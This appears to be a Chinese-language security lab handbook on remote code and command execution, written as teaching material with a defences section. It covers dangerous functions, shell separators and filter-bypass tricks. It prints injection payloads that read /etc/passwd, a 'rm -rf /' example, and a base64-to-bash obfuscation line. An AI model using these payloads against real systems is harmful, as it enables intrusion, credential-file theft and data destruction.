# 💀 实验手册：RCE 远程代码/命令执行

### 0. 序言
在漏洞界，RCE 是当之无愧的"王者"。一旦实现远程代码执行，攻击者就相当于坐在了服务器面前。

*   **RCE（Remote Code Execution）**：让攻击者在目标系统上执行任意代码或命令的漏洞。
*   **核心思想**：你以为用户在用你的功能，其实用户在用你的服务器。

本章目标：**理解为什么"一个输入框"可以变成"一把钥匙"。**

---

### 1. 命令注入 vs 代码执行

**命令注入（Command Injection）**：
```
用户输入被拼接到系统命令中执行
例：ping user_input → ping 127.0.0.1; cat /etc/passwd
```

**代码执行（Code Execution）**：
```
用户输入被当作代码解析执行
例：eval(user_input) → eval("__import__('os').system('id')")
```

**核心区别**：
- 命令注入：调用操作系统 shell
- 代码执行：在应用程序运行时中执行

---

### 2. 命令注入的常见场景

**危险函数（各语言）**：
```java
// Java
Runtime.getRuntime().exec(userInput);

// Python
os.system(userInput)
subprocess.Popen(userInput, shell=True)

// PHP
system($userInput);
exec($userInput);
shell_exec($userInput);

// Node.js
child_process.exec(userInput);
```

**典型漏洞场景**：
```
文件名处理：convert image.jpg; rm -rf /
域名检测：ping google.com; cat /etc/passwd
PDF 生成：wkhtmltopdf url; id
压缩解压：tar -xvf file.tar; whoami
```

---

### 3. 命令拼接符号大全

**Linux/Unix**：
```bash
; 命令1; 命令2          # 顺序执行
| 命令1 | 命令2          # 管道
|| 命令1 || 命令2        # 前者失败才执行后者
&& 命令1 && 命令2        # 前者成功才执行后者
& 命令1 & 命令2          # 后台执行
` `命令` `               # 命令替换
$() $(命令)              # 命令替换
```

**Windows**：
```cmd
& 命令1 & 命令2          # 顺序执行
| 命令1 | 命令2          # 管道
|| 命令1 || 命令2        # 前者失败才执行后者
&& 命令1 && 命令2        # 前者成功才执行后者
```

---

### 4. 代码执行漏洞

**PHP**：
```php
eval($_GET['code']);
assert($_GET['code']);
preg_replace('/e', $_GET['code'], $input);  // PHP < 5.5
```

**Python**：
```python
eval(user_input)
exec(user_input)
compile(user_input, '', 'exec')
```

**JavaScript（Node.js）**：
```javascript
eval(userInput);
new Function(userInput)();
vm.runInNewContext(userInput);
```

---

### 5. 绕过技巧速览

**空格绕过**：
```bash
cat</etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd  # Tab
```

**关键字绕过**：
```bash
c''at /etc/passwd
c""at /etc/passwd
c\at /etc/passwd
/bin/ca? /etc/passwd
```

**编码绕过**：
```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
```

---

### 6. 防御措施

**输入验证（白名单）**：
```python
ALLOWED_COMMANDS = ['status', 'version', 'help']
if user_input not in ALLOWED_COMMANDS:
    raise SecurityError("Command not allowed")
```

**参数化执行**：
```python
# 危险
os.system(f"ping {user_input}")

# 安全
subprocess.run(['ping', '-c', '4', user_input], shell=False)
```

**沙箱/容器隔离**：
将危险操作隔离在受限环境中执行。

**最小权限原则**：
应用程序不应以 root 权限运行。

---

### 7. 结语

RCE 之所以被称为"王者漏洞"，是因为它直接突破了应用层的边界，让攻击者获得了系统级的控制权。

记住：**永远不要把用户输入直接拼接到命令或代码中执行。**

---

**[准备好了吗？去感受"掌控服务器"的力量吧]**
